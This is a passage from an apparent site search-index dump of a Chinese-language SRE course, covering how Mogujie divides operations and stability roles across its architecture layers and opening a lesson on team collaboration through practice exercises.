<p>\u90a3\u4e0b\u9762\u6211\u5c31\u4ee5\u8611\u83c7\u8857\u7684\u6280\u672f\u67b6\u6784\u4e3a\u4f8b\uff0c\u5e26\u4f60\u4e00\u8d77\u6765\u770b\uff0c\u5728\u8fd9\u6837\u4e00\u4e2a\u6280\u672f\u67b6\u6784\u4f53\u7cfb\u4e0b\uff0cSRE\u7684\u89d2\u8272\u3001\u804c\u8d23\u5206\u5de5\u4ee5\u53ca\u534f\u4f5c\u6a21\u5f0f\u5e94\u8be5\u662f\u600e\u4e48\u6837\u7684\u3002</p>"},{"location":"ops/50-sre-mogu-09/#sre_1","title":"\u8611\u83c7\u8857\u7684SRE\u7ec4\u7ec7\u67b6\u6784\u5b9e\u8df5","text":"<p>\u6211\u4eec\u56de\u5230\u5728\u5f00\u5934\u7ed9\u51fa\u7684\u6280\u672f\u67b6\u6784\u56fe\uff0c\u53ef\u4ee5\u770b\u5230\u4e0a\u4e0b\u5de6\u53f3\u603b\u5171\u5206\u4e86\u4e94\u5757\u533a\u57df\uff0c\u6211\u4eec\u5c31\u5206\u5757\u6765\u770b\u3002</p> <p>\u5148\u770b\u6700\u4e0b\u9762\u7684**\u57fa\u7840\u8bbe\u65bd\u5c42**\uff0c\u6211\u4eec\u73b0\u5728\u4e5f\u5b9a\u4e49\u4e3aIaaS\u5c42\uff0c\u4e3b\u8981\u662f\u4ee5\u8d44\u6e90\u4e3a\u4e3b\uff0c\u5305\u62ecIDC\u3001\u670d\u52a1\u5668\u3001\u865a\u62df\u673a\u3001\u5b58\u50a8\u4ee5\u53ca\u7f51\u7edc\u7b49\u90e8\u5206\u3002</p> <p>\u8fd9\u91cc\u57fa\u7840\u8bbe\u65bd\u5c42\u548c\u6240\u9700\u7684\u8fd0\u7ef4\u80fd\u529b\uff0c\u5176\u5b9e\u5c31\u662f\u6211\u4eec\u5e38\u8bf4\u7684**\u4f20\u7edf\u8fd0\u7ef4\u8fd9\u4e2a\u89d2\u8272\u6240\u8981\u5177\u5907\u7684\u80fd\u529b**\u3002\u4f46\u662f\u8fd9\u4e00\u5c42\u73b0\u5728\u5bf9\u4e8e\u7edd\u5927\u591a\u6570\u7684\u516c\u53f8\uff0c\u65e0\u8bba\u5728\u8d44\u6e90\u5c42\u9762\u8fd8\u662f\u5728\u80fd\u529b\u5c42\u9762\uff0c\u90fd\u6709\u5f88\u5927\u7684\u53ef\u66ff\u4ee3\u6027\u3002\u5982\u679c\u80fd\u591f\u4f9d\u6258\u4e91\u7684\u80fd\u529b\uff0c\u4e0d\u7ba1\u662f\u516c\u6709\u4e91\u8fd8\u662f\u79c1\u6709\u4e91\uff0c\u8fd9\u4e00\u90e8\u5206\u4f20\u7edf\u8fd0\u7ef4\u7684\u80fd\u529b\u5728\u7edd\u5927\u90e8\u5206\u516c\u53f8\uff0c\u57fa\u672c\u5c31\u4e0d\u9700\u8981\u4e86\u3002</p> <p>\u63a5\u4e0b\u6765\u5f80\u4e0a\uff0c\u6211\u4eec\u6765\u770b\u4e2d\u53f0\u8fd9\u4e00\u5c42\u3002\u8fd9\u91cc\u5305\u62ec\u4e24\u90e8\u5206\uff0c\u6280\u672f\u4e2d\u53f0**\u548c**\u4e1a\u52a1\u4e2d\u53f0\u3002</p> <p>\u6280\u672f\u4e2d\u53f0\u4e3b\u8981\u5305\u62ec\u6211\u4eec\u4f7f\u7528\u5230\u7684\u5404\u79cd\u5206\u5e03\u5f0f\u90e8\u4ef6\uff0c\u5982\u7f13\u5b58\u3001\u6d88\u606f\u3001\u6570\u636e\u5e93\u3001\u5bf9\u8c61\u5b58\u50a8\u4ee5\u53ca\u5927\u6570\u636e\u7b49\u4ea7\u54c1\uff0c\u8fd9\u4e00\u5c42\u6700\u5927\u7684\u7279\u70b9\u5c31\u662f\u201c\u6709\u72b6\u6001\u201d \uff0c\u4e5f\u5c31\u662f\u8981\u5b58\u50a8\u6570\u636e\u7684\u4ea7\u54c1\u3002</p> <p>\u4e1a\u52a1\u4e2d\u53f0\u5c42\uff0c\u5c31\u662f\u5c06\u5177\u6709\u4e1a\u52a1\u5171\u6027\u7684\u4ea7\u54c1\u80fd\u529b\u63d0\u70bc\u51fa\u6765\uff0c\u6bd4\u5982\u7528\u6237\u3001\u5546\u54c1\u3001\u4ea4\u6613\u3001\u652f\u4ed8\u3001\u98ce\u63a7\u4ee5\u53ca\u4f18\u60e0\u7b49\u7b49\uff0c\u4e0a\u9762\u652f\u6491\u7684\u662f\u4e1a\u52a1\u524d\u53f0\u5e94\u7528\u3002</p> <p>\u4ec0\u4e48\u662f\u4e1a\u52a1\u524d\u53f0\u5462\uff1f\u5982\u679c\u4ee5\u963f\u91cc\u7684\u4ea7\u54c1\u4f53\u7cfb\u6765\u4e3e\u4f8b\uff0c\u53ef\u4ee5\u7c7b\u6bd4\u4e3a\u6dd8\u5b9d\u3001\u5929\u732b\u3001\u76d2\u9a6c\u3001\u805a\u5212\u7b97\u8fd9\u6837\u7684\u4e1a\u52a1\u4ea7\u54c1\u3002</p> <p>\u65e0\u8bba\u8fd9\u4e9b\u4e1a\u52a1\u524d\u53f0\u7684\u5f62\u6001\u662f\u4ec0\u4e48\u6837\uff0c\u4f46\u662f\u90fd\u4f1a\u5229\u7528\u5230\u4e2d\u53f0\u8fd9\u4e9b\u5171\u4eab\u80fd\u529b\u3002\u8fd9\u4e24\u5c42\u5c31\u662f\u5fae\u670d\u52a1\u5316\u5f62\u6001\u7684\u4e1a\u52a1\u5e94\u7528\u4e86\uff0c\u8fd9\u4e9b\u5e94\u7528\u6700\u5927\u7684\u7279\u70b9\u5c31\u662f\u201c\u65e0\u72b6\u6001\u201d\uff0c\u6709\u72b6\u6001\u7684\u6570\u636e\u90fd\u4f1a\u6c89\u6dc0\u5230\u521a\u624d\u63d0\u5230\u7684\u6280\u672f\u4e2d\u53f0\u7684\u4ea7\u54c1\u4e2d\u3002</p> <p>\u6700\u4e0a\u9762\u662f\u63a5\u5165\u5c42\uff0c\u5206\u4e3a\u56db\u5c42\u8d1f\u8f7d\u5747\u8861\u548c\u4e03\u5c42\u8d1f\u8f7d\u5747\u8861\u3002\u524d\u8005\u56e0\u4e3a\u8ddf\u4e1a\u52a1\u903b\u8f91\u4e0d\u76f8\u5173\uff0c\u6240\u4ee5\u901a\u5e38\u4f1a\u8ddf\u57fa\u7840\u8bbe\u65bd\u5c42\u653e\u5728\u4e00\u8d77\uff0c\u7531\u4f20\u7edf\u8fd0\u7ef4\u8d1f\u8d23\u3002\u4f46\u662f\u4e03\u5c42\u8d1f\u8f7d\u9700\u8981\u505a\u5f88\u591a\u4e1a\u52a1\u5c42\u9762\u7684\u89c4\u5219\u914d\u7f6e\uff0c\u6240\u4ee5\u901a\u5e38\u4f1a\u8ddf\u4e2d\u53f0\u548c\u524d\u53f0\u4e00\u8d77\u8fd0\u7ef4\uff0c\u90a3\u8fd9\u90e8\u5206\u804c\u8d23\u5e94\u8be5\u5c5e\u4e8e\u54ea\u4e2a\u89d2\u8272\u5462\uff1f\u6211\u4eec\u63a5\u4e0b\u6765\u5c31\u4f1a\u8bb2\u5230\u3002</p> <p>\u4e2d\u53f0\u53ca\u524d\u53f0\u7684\u8fd0\u7ef4\u804c\u8d23\u662f\u600e\u4e48\u5206\u5de5\u7684\u5462\uff1f</p> <p>\u6280\u672f\u4e2d\u53f0\u7684\u5f88\u591a\u90e8\u4ef6\u76f8\u5bf9\u6bd4\u8f83\u6807\u51c6\u548c\u901a\u7528\uff0c\u800c\u4e14\u5728\u516c\u6709\u4e91\u4e0a\u4e5f\u76f8\u5bf9\u6bd4\u8f83\u6210\u719f\u4e86\uff0c\u6bd4\u5982\u6570\u636e\u5e93\u548c\u7f13\u5b58\uff0c\u5bf9\u4e8e\u7edd\u5927\u90e8\u5206\u516c\u53f8\u662f\u53ef\u4ee5\u76f4\u63a5\u9009\u62e9\u5bf9\u5e94\u7684\u516c\u6709\u4e91\u4ea7\u54c1\u7684\uff0c\u6bd4\u5982\u8611\u83c7\u8857\uff0c\u57fa\u672c\u90fd\u5df2\u7ecf\u5c06\u8fd9\u4e9b\u80fd\u529b\u8fc1\u79fb\u5230\u4e86\u4e91\u4e0a\u3002</p> <p>\u5728\u6ca1\u6709\u4e0a\u4e91\u4e4b\u524d\uff0c\u6211\u4eec\u7684\u4e2d\u95f4\u4ef6\u56e2\u961f\u4f1a\u81ea\u7814\u5bf9\u5e94\u7684\u6280\u672f\u4ea7\u54c1\uff0c\u8fd9\u90e8\u5206\u4ea7\u54c1\u7684\u8fd0\u7ef4\u4e5f\u4f1a\u7531\u4e2d\u95f4\u4ef6\u56e2\u961f\u81ea\u8fd0\u7ef4\u3002\u5f88\u591a\u5927\u578b\u7684\u516c\u53f8\u4f1a\u6709\u4e13\u95e8\u7684\u5e73\u53f0\u8fd0\u7ef4\u56e2\u961f\uff0c\u8d1f\u8d23\u6574\u4e2a\u4e2d\u95f4\u4ef6\u4ea7\u54c1\u7684\u8fd0\u7ef4\u3002</p> <p>\u4e1a\u52a1\u4e2d\u53f0\u548c\u524d\u53f0\u8fd9\u4e24\u5c42\u7684\u8fd0\u7ef4\u804c\u8d23\uff0c\u901a\u5e38\u5c31\u662f\u6211\u4eec\u5e38\u8bf4\u7684\u5e94\u7528\u8fd0\u7ef4\u3001PE\uff08Production Engineer\uff09\u6216\u8005\u53eb\u6280\u672f\u8fd0\u8425\u8fd9\u6837\u7684\u89d2\u8272\u6765\u627f\u62c5\u3002\u5728\u6211\u81ea\u5df1\u7684\u56e2\u961f\u662f\u7edf\u4e00\u7528PE\u6765\u4ee3\u8868\u7684\u3002</p> <p>\u5176\u5b9e\u8fd9\u91ccPE\u7684\u804c\u8d23\u8ddf\u6211\u4eec\u524d\u9762\u8bb2\u7684SRE\u7684\u804c\u8d23\u5df2\u7ecf\u975e\u5e38\u63a5\u8fd1\u4e86\u3002\u5728\u56fd\u5185\uff0cPE\u8fd9\u4e2a\u89d2\u8272\u4e0eGoogle\u5b9a\u4e49\u7684SRE\u6240\u5177\u5907\u7684\u80fd\u529b\uff0c\u6700\u5927\u5dee\u522b\u5c31\u5728\u4e8e\u56fd\u5185PE\u7684\u8f6f\u4ef6\u5de5\u7a0b\u80fd\u529b\u6709\u6240\u7f3a\u5931\u6216\u76f8\u5bf9\u8f83\u5f31\u3002\u8fd9\u5c31\u5bfc\u81f4\u5f88\u591a\u57fa\u4e8e\u6280\u672f\u4e2d\u53f0\u7684\u81ea\u52a8\u5316\u5de5\u5177\u3001\u670d\u52a1\u6cbb\u7406\u4ee5\u53ca\u7a33\u5b9a\u6027\u4fdd\u969c\u7c7b\u7684\u5e73\u53f0\u6ca1\u529e\u6cd5\u81ea\u5df1\u7814\u53d1\uff0c\u9700\u8981\u7531\u53e6\u5916\u4e00\u4e2a\u56e2\u961f\u6765\u652f\u6491\u548c\u5f25\u8865\uff0c\u4e5f\u5c31\u662f\u56fe\u4e2d\u6280\u672f\u4e2d\u53f0\u7684\u884d\u751f\u90e8\u5206\uff0c\u6280\u672f\u4fdd\u969c\u4f53\u7cfb\u3002</p> <p>PE\u8fd9\u4e2a\u89d2\u8272\uff0c\u662f\u6211\u4eec\u672a\u6765\u5f15\u5165SRE\u5b9e\u8df5\u7684\u975e\u5e38\u5173\u952e\u4e00\u73af\uff0cPE\u8981\u8ddf\u4e1a\u52a1\u5f00\u53d1\u56e2\u961f\u4e00\u8d77\u5bf9\u4e1a\u52a1\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027\u8d1f\u8d23\u3002</p> <p>\u90a3\u6211\u4eec\u63a5\u7740\u770b\u6280\u672f\u4fdd\u969c\u4f53\u7cfb\u3002</p> <p>\u6280\u672f\u4fdd\u969c\u5e73\u53f0\uff0c\u8fd9\u90e8\u5206\u7684\u80fd\u529b\u4e00\u5b9a\u57fa\u4e8e\u6280\u672f\u4e2d\u53f0\u7684\u80fd\u529b\u4e4b\u4e0a\u751f\u957f\u51fa\u6765\u7684\uff0c\u662f\u6280\u672f\u4e2d\u53f0\u7684\u4e00\u90e8\u5206\uff0c\u5982\u679c\u8131\u79bb\u4e86\u8fd9\u4e2a\u67b6\u6784\u4f53\u7cfb\uff0c\u8fd9\u4e2a\u6280\u672f\u4fdd\u969c\u4f53\u7cfb\u662f\u6ca1\u6709\u4efb\u4f55\u610f\u4e49\u7684\u3002\u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u53c8\u8981\u5f3a\u8c03\u4e00\u4e2a\u7406\u5ff5\uff1a\u201c\u8fd0\u7ef4\u80fd\u529b\u4e00\u5b9a\u662f\u6574\u4e2a\u6280\u672f\u67b6\u6784\u80fd\u529b\u7684\u4f53\u73b0\uff0c\u800c\u4e0d\u662f\u5355\u7eaf\u7684\u8fd0\u7ef4\u7684\u8fd0\u7ef4\u80fd\u529b\u4f53\u73b0\u201d\u3002\u5fae\u670d\u52a1\u548c\u5206\u5e03\u5f0f\u67b6\u6784\u4e0b\u7684\u8fd0\u7ef4\u80fd\u529b\uff0c\u4e00\u5b9a\u662f\u8ddf\u6574\u4e2a\u67b6\u6784\u4f53\u7cfb\u4e0d\u5206\u5bb6\u7684\u3002</p> <p>\u5b83\u4eec\u7684\u5177\u4f53\u4f9d\u8d56\u5173\u7cfb\uff0c\u6211\u5728\u56fe\u4e2d\u5df2\u7ecf\u6807\u793a\u51fa\u6765\uff0c\u4f60\u53ef\u4ee5\u7ed3\u5408\u6211\u7ed9\u51fa\u7684\u56fe\u793a\u518d\u4f53\u4f1a\u548c\u6df1\u5165\u7406\u89e3\u4e00\u4e0b\u3002</p> <p>\u56de\u5230\u6280\u672f\u4fdd\u969c\u4f53\u7cfb\u7684\u5efa\u8bbe\u4e0a\uff0c\u6211\u4eec\u770b\u4e0b\u67b6\u6784\u56fe\u7684\u53f3\u4fa7\uff0c\u5b83\u53c8\u5206\u4e3a\u6548\u7387\u548c\u7a33\u5b9a\u4e24\u5757\u3002</p> <p>\u5de5\u5177\u5e73\u53f0\u56e2\u961f\uff0c\u8d1f\u8d23\u6548\u80fd\u5de5\u5177\u7684\u7814\u53d1\uff0c\u6bd4\u5982\u5b9e\u73b0CMDB\u3001\u8fd0\u7ef4\u81ea\u52a8\u5316\u3001\u6301\u7eed\u4ea4\u4ed8\u6d41\u6c34\u7ebf\u4ee5\u53ca\u90e8\u5206\u6280\u672f\u8fd0\u8425\u62a5\u8868\u7684\u5b9e\u73b0\uff0c\u4e3a\u57fa\u7840\u8fd0\u7ef4\u548c\u5e94\u7528\u8fd0\u7ef4\u63d0\u4f9b\u6548\u7387\u5e73\u53f0\u652f\u6301\u3002\u8fd9\u4e2a\u8981\u66f4\u591a\u5730\u4ecb\u5165\u5230\u7814\u53d1\u6d41\u7a0b\u4e2d\uff0c\u56e0\u4e3a\u6d41\u7a0b\u590d\u6742\u5ea6\u6bd4\u8f83\u9ad8\uff0c\u800c\u4e14\u8fd8\u8981\u5bf9\u63a5\u5f88\u591a\u7814\u53d1\u5e73\u53f0\uff0c\u5982Git\u3001Maven\u3001\u4ee3\u7801\u626b\u63cf\u3001\u81ea\u52a8\u5316\u6d4b\u8bd5\u4ee5\u53ca\u5b89\u5168\u7b49\u5e73\u53f0\uff0c\u6240\u4ee5\u5bf9\u4e1a\u52a1\u7406\u89e3\u53ca\u7cfb\u7edf\u96c6\u6210\u80fd\u529b\u8981\u6bd4\u8f83\u5f3a\uff0c\u4f46\u662f\u6280\u672f\u80fd\u529b\u8981\u6c42\u76f8\u5bf9\u5c31\u6ca1\u90a3\u4e48\u9ad8\u3002</p> <p>\u7a33\u5b9a\u6027\u5e73\u53f0\u56e2\u961f\uff0c\u8d1f\u8d23\u7a33\u5b9a\u6027\u4fdd\u969c\u76f8\u5173\u7684\u6807\u51c6\u548c\u5e73\u53f0\uff0c\u6bd4\u5982\u76d1\u63a7\u3001\u670d\u52a1\u6cbb\u7406\u76f8\u5173\u7684\u9650\u6d41\u964d\u7ea7\u3001\u5168\u94fe\u8def\u8ddf\u8e2a\u3001\u5bb9\u91cf\u538b\u6d4b\u548c\u89c4\u5212\u3002\u6211\u4eec\u4f1a\u770b\u5230\u8fd9\u4e2a\u56e2\u961f\u4e3b\u8981\u662f\u4e3a\u7a33\u5b9a\u6027\u4fdd\u969c\u63d0\u4f9b\u652f\u6491\uff0c\u5e73\u53f0\u63d0\u4f9b\u51fa\u6765\u7684\u80fd\u529b\u662f\u53ef\u4ee5\u76f4\u63a5\u652f\u6491\u4e1a\u52a1\u5f00\u53d1\u56e2\u961f\u7684\uff0c\u53cd\u5012\u662fPE\u8fd9\u6837\u7684\u89d2\u8272\u5e76\u4e0d\u4f1a\u76f4\u63a5\u4f7f\u7528\u3002</p> <p>\u8fd9\u4e2a\u56e2\u961f\u548c\u4eba\u5458\u7684\u6280\u672f\u80fd\u529b\u8981\u6c42\u4f1a\u6bd4\u8f83\u9ad8\uff0c\u56e0\u4e3a\u8fd9\u91cc\u9762\u5f88\u591a\u7684\u6280\u672f\u70b9\u662f\u8981\u6df1\u5165\u5230\u4ee3\u7801\u5e95\u5c42\u7684\uff0c\u6bd4\u5982Java\u7684\u5b57\u8282\u7801\u6216Socket\u7f51\u7edc\uff1b\u6709\u65f6\u8fd8\u8981\u9762\u5bf9\u6d77\u91cf\u6570\u636e\uff0c\u4ee5\u53ca\u4f4e\u65f6\u5ef6\u5b9e\u65f6\u8ba1\u7b97\u7684\u5904\u7406\uff0c\u6bd4\u5982\u5168\u94fe\u8def\u8ddf\u8e2a\u548c\u76d1\u63a7\uff1b\u751a\u81f3\u662f\u95e8\u69db\u66f4\u9ad8\u7684AIOps\uff0c\u8fd8\u8981\u61c2\u4e13\u4e1a\u7b97\u6cd5\u3002\u6240\u4ee5\u8fd9\u4e2a\u56e2\u961f\u7684\u5efa\u8bbe\u590d\u6742\u5ea6\u4f1a\u6bd4\u8f83\u9ad8\uff0c\u4f1a\u9700\u8981\u5f88\u591a\u4e0d\u540c\u9886\u57df\u7684\u4e13\u4e1a\u4eba\u5458\u3002</p> <p>\u597d\u4e86\uff0c\u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u4ece\u6280\u672f\u67b6\u6784\u5165\u624b\uff0c\u5c42\u5c42\u5256\u6790\uff0c\u5206\u6790\u4e86\u5bf9\u5e94\u7684\u4eba\u5458\u5b89\u6392\u548c\u80fd\u529b\uff0c\u4f60\u4f1a\u53d1\u73b0\uff0c\u6309\u7167\u5206\u5c42\u8fdb\u884c\u804c\u8d23\u5206\u5de5\u5c31\u662f\uff1a\u57fa\u7840\u8bbe\u65bd\u548c\u63a5\u5165\u5c42\u76844\u5c42\u8d1f\u8f7d\u90e8\u5206\u5c5e\u4e8e\u4f20\u7edf\u8fd0\u7ef4\uff1b\u6280\u672f\u4e2d\u53f0\u5982\u679c\u81ea\u7814\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u5e38\u8bf4\u7684\u4e2d\u95f4\u4ef6\u56e2\u961f\uff0c\u5f00\u53d1\u540c\u5b66\u81ea\u5df1\u8d1f\u8d23\u5bf9\u5e94\u7684\u5de5\u4f5c\uff0c\u5982\u679c\u4e0a\u4e91\uff0c\u5219\u7531PE\u8d1f\u8d23\uff1b\u4e1a\u52a1\u4e2d\u53f0\u3001\u4e1a\u52a1\u524d\u53f0\u4ee5\u53ca\u63a5\u5165\u5c42\u76847\u5c42\u8d1f\u8d23\u5747\u8861\uff0c\u540c\u6837\u662f\u7531PE\u6765\u8d1f\u8d23\u3002</p> <p>\u5982\u679c\u6211\u4eec\u7528\u4e00\u5f20\u7ec4\u7ec7\u67b6\u6784\u56fe\u6765\u5c55\u793a\u7684\u8bdd\uff0c\u57fa\u672c\u5f62\u6001\u5c31\u662f\u4e0b\u56fe\uff1a</p> <p></p>"},{"location":"ops/50-sre-mogu-09/#_1","title":"\u603b\u7ed3","text":"<p>\u7ed9\u51fa\u8fd9\u5f20\u7ec4\u7ec7\u67b6\u6784\u56fe\uff0c\u6211\u4eec\u4eca\u5929\u7684\u5185\u5bb9\u4e5f\u5c31\u8bb2\u5b8c\u4e86\u3002\u603b\u7ed3\u4e00\u4e0b\uff0c\u4ece\u7ec4\u7ec7\u67b6\u6784\u7684\u89d2\u5ea6\u6765\u8bb2\uff0c\u5bf9\u4e8e\u7a33\u5b9a\u6027\u6216\u8005\u8bf4SRE\u6211\u4eec\u53ef\u4ee5\u63a8\u5bfc\u51fa\u4e00\u4e2a\u7ed3\u8bba\uff1aSRE\u5e76\u4e0d\u662f\u4e00\u4e2a\u5355\u7eaf\u7684\u5c97\u4f4d\u5b9a\u4e49\uff0c\u5b83\u662f\u7531\u591a\u4e2a\u4e0d\u540c\u89d2\u8272\u7ec4\u5408\u800c\u6210\u7684\u4e00\u4e2a\u56e2\u961f\u3002\u5982\u679c\u4ece\u5206\u5de5\u6765\u770b\u5c31\u662f\uff1a</p> <p><code>SRE = PE + \u5de5\u5177\u5e73\u53f0\u5f00\u53d1 + \u7a33\u5b9a\u6027\u5e73\u53f0\u5f00\u53d1</code></p> <p>\u540c\u65f6\uff0c\u8fd9\u91cc\u7684SRE\uff0c\u8ddf\u6211\u4eec\u524d\u9762\u8bb2\u7684\u8fd0\u7ef4\u548c\u67b6\u6784\u4e0d\u5206\u5bb6\u4e00\u6837\uff0c\u5728\u7ec4\u7ec7\u67b6\u6784\u4e0a\uff0c\u662f\u4e0e\u627f\u62c5\u6280\u672f\u4e2d\u53f0\u6216\u5206\u5e03\u5f0f\u67b6\u6784\u5efa\u8bbe\u7684\u4e2d\u95f4\u4ef6\u56e2\u961f\u5728\u540c\u4e00\u4e2a\u4f53\u7cfb\u4e2d\u7684\u3002</p> <p>\u6839\u636e\u6211\u5e73\u65f6\u7684\u4ea4\u6d41\u60c5\u51b5\u770b\uff0c\u5f88\u591a\u7684\u4f20\u7edf\u884c\u4e1a\u4e5f\u57fa\u672c\u662f\u6309\u7167\u8fd9\u6837\u4e00\u4e2a\u6a21\u5f0f\u7ec4\u5efaSRE\u4f53\u7cfb\uff0c\u4e00\u65b9\u9762\u4f1a\u6709\u5411\u4e92\u8054\u7f51\u501f\u9274\u7684\u539f\u56e0\uff0c\u53e6\u4e00\u65b9\u9762\uff0c\u6211\u89c9\u5f97\u4e5f\u662f\u672c\u8d28\u7684\u539f\u56e0\uff0c\u5c31\u662f\u524d\u9762\u6211\u4eec\u63d0\u5230\u7684\uff0c\u7ec4\u7ec7\u67b6\u6784\u5f80\u5f80\u662f\u4e0e\u6280\u672f\u67b6\u6784\u76f8\u5339\u914d\u7684\uff0c\u6280\u672f\u4e0a\u5982\u679c\u671d\u7740\u5206\u5e03\u5f0f\u548c\u5fae\u670d\u52a1\u67b6\u6784\u7684\u65b9\u5411\u6f14\u8fdb\uff0c\u90a3\u5fc5\u7136\u4f1a\u4ea7\u751f\u51fa\u7c7b\u4f3c\u7684\u7ec4\u7ec7\u6a21\u5f0f\u3002</p> <p>\u8bb2\u5230\u8fd9\u91cc\uff0c\u4e00\u4e2a\u5178\u578b\u7684\u4e92\u8054\u7f51\u5f0f\u7684SRE\u7ec4\u7ec7\u67b6\u6784\u5c31\u4ecb\u7ecd\u5b8c\u4e86\uff0c\u4f46\u662f\u4ec5\u6709\u7ec4\u7ec7\u67b6\u6784\u662f\u4e0d\u591f\u7684\uff0c\u8fd8\u9700\u8981\u7ee7\u7eed\u6df1\u5165\u4e0b\u53bb\uff0c\u770b\u770b\u8fd9\u4e2a\u7ec4\u7ec7\u4e0b\u7684\u6bcf\u4e2a\u89d2\u8272\u662f\u5982\u4f55\u4e0e\u5916\u90e8\u534f\u4f5c\uff0c\u5982\u4f55\u53d1\u6325\u7a33\u5b9a\u6027\u4fdd\u969c\u7684\u5177\u4f53\u804c\u80fd\u7684\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u4e0b\u4e00\u8bb2\u5c31\u4f1a\u7ed3\u5408\u5177\u4f53\u7684\u7a33\u5b9a\u6027\u4fdd\u969c\u573a\u666f\uff0c\u6765\u5206\u4eabSRE\u4e0e\u5176\u4ed6\u7ec4\u7ec7\u7684\u534f\u4f5c\u6a21\u5f0f\u662f\u600e\u4e48\u6837\u7684\u3002</p>"},{"location":"ops/50-sre-mogu-10/","title":"10 | \u7ecf\u9a8c\uff1a\u90fd\u6709\u54ea\u4e9b\u9ad8\u6548\u7684SRE\u7ec4\u7ec7\u534f\u4f5c\u673a\u5236\uff1f","text":"<p>\u4e0a\u8282\u8bfe\uff0c\u6211\u4eec\u8bb2\u4e86\u5728\u4e92\u8054\u7f51\u4f01\u4e1a\u5178\u578b\u7684SRE\u56e2\u961f\u4e2d\uff0c\u4e00\u822c\u5305\u542b\u51e0\u4e2a\u5173\u952e\u89d2\u8272\uff0cPE\u3001\u5de5\u5177\u5f00\u53d1\u548c\u7a33\u5b9a\u6027\u5f00\u53d1\uff0c\u4ed6\u4eec\u5206\u522b\u627f\u62c5\u7684\u804c\u8d23\u5c31\u662f\u4e1a\u52a1\u8fd0\u7ef4\u3001\u5efa\u8bbe\u8fd0\u7ef4\u81ea\u52a8\u5316\u5e73\u53f0\u548c\u5efa\u8bbe\u7a33\u5b9a\u6027\u5e73\u53f0\u3002\u5728\u5efa\u8bbe\u8fd9\u4e9b\u5e73\u53f0\u7684\u8fc7\u7a0b\u4e2d\uff0c\u8fd9\u4e9b\u89d2\u8272\u5bf9\u5185\u8981\u4e0e\u4e2d\u95f4\u4ef6\u56e2\u961f\u5408\u4f5c\uff0c\u57fa\u4e8e\u5fae\u670d\u52a1\u548c\u5206\u5e03\u5f0f\u7684\u67b6\u6784\u6765\u5f00\u53d1\u5404\u7c7b\u5e73\u53f0\uff1b\u5bf9\u5916\uff0c\u8fd8\u8981\u4e0e\u4e1a\u52a1\u5f00\u53d1\u914d\u5408\uff0c\u5c06\u63d0\u5347\u6548\u7387\u548c\u7a33\u5b9a\u6027\u7684\u80fd\u529b\u63d0\u4f9b\u51fa\u53bb\u3002</p> <p>\u4f46\u662f\u4ec5\u4ec5\u6709\u7ec4\u7ec7\u67b6\u6784\uff0c\u6709\u4e86\u961f\u5f62\u8fd8\u662f\u4e0d\u591f\u7684\uff0c\u5404\u4e2a\u56e2\u961f\u548c\u89d2\u8272\u4e4b\u95f4\u5fc5\u987b\u8981\u914d\u5408\u534f\u4f5c\u8d77\u6765\u624d\u80fd\u53d1\u6325\u51faSRE\u7684\u4f5c\u7528\uff0c\u7279\u522b\u662f\u5bf9\u5916\u4e0e\u4e1a\u52a1\u5f00\u53d1\u7684\u5408\u4f5c\uff0c\u8fd9\u6837\u624d\u80fd\u662f\u4e00\u4e2a\u6709\u673a\u7684\u6574\u4f53\u3002</p> <p>\u90a3\u600e\u6837\u624d\u80fd\u5c06\u8fd9\u4e9b\u89d2\u8272\u6709\u6548\u5730\u7ec4\u5408\u5230\u4e00\u8d77\u5462\uff1f\u4eca\u5929\u6211\u5c31\u548c\u4f60\u5206\u4eab\u4e0b\u6211\u7684\u7ecf\u9a8c\uff0c\u603b\u7ed3\u8d77\u6765\u5c31\u662f\u56db\u4e2a\u5b57\uff1a\u4ee5\u8d5b\u5e26\u7ec3\u3002</p>"},{"location":"ops/50-sre-mogu-10/#_1","title":"\u4ec0\u4e48\u662f\u201c\u4ee5\u8d5b\u5e26\u7ec3\u201d\uff1f","text":"<p>\u201c\u4ee5\u8d5b\u4ee3\u7ec3\u201d\u8fd9\u4e2a\u672f\u8bed\u6700\u65e9\u4e5f\u662f\u5728\u4e00\u4e9b\u4f53\u80b2\u8d5b\u4e8b\u4e2d\u63d0\u51fa\u6765\u7684\uff0c\u5b8c\u6574\u89e3\u91ca\u662f\u901a\u8fc7\u6bd4\u8d5b\u5e26\u52a8\u8bad\u7ec3\u3002\u6bd4\u5982\u8db3\u7403\u3001\u7bee\u7403\u6216\u7530\u5f84\u7b49\u6bd4\u8d5b\uff0c\u76ee\u7684\u5c31\u662f\u8ba9\u8fd0\u52a8\u5458\u5728\u771f\u5b9e\u7684\u9ad8\u5f3a\u5ea6\u7ade\u4e89\u6001\u52bf\u548c\u538b\u529b\u4e0b\uff0c\u5145\u5206\u66b4\u9732\u51fa\u4e2a\u4eba\u548c\u56e2\u961f\u7684\u4e0d\u8db3\u53ca\u8584\u5f31\u70b9\uff0c\u7136\u540e\u5728\u540e\u7eed\u7684\u8bad\u7ec3\u4e2d\u6709\u9488\u5bf9\u6027\u5730\u6539\u8fdb\uff0c\u8fd9\u6837\u5bf9\u4e8e\u6bd4\u8d5b\u6210\u7ee9\u7684\u63d0\u5347\u6709\u5f88\u5927\u5e2e\u52a9\uff0c\u800c\u4e0d\u662f\u5faa\u89c4\u8e48\u77e9\u5730\u505a\u673a\u68b0\u6027\u8bad\u7ec3\u3002\u4f60\u4e5f\u6ce8\u610f\u5230\uff0c\u6211\u7528\u7684\u662f\u201c\u5e26\u201d\uff0c\u800c\u4e0d\u662f\u201c\u4ee3\u201d\uff0c\u6240\u4ee5\u6574\u4e2a\u8fc7\u7a0b\u4e0d\u662f\u7528\u6bd4\u8d5b\u4ee3\u66ff\u8bad\u7ec3\uff0c\u5b83\u66f4\u4e3b\u8981\u7684\u4f5c\u7528\u662f\u5e26\u52a8\u3002</p> 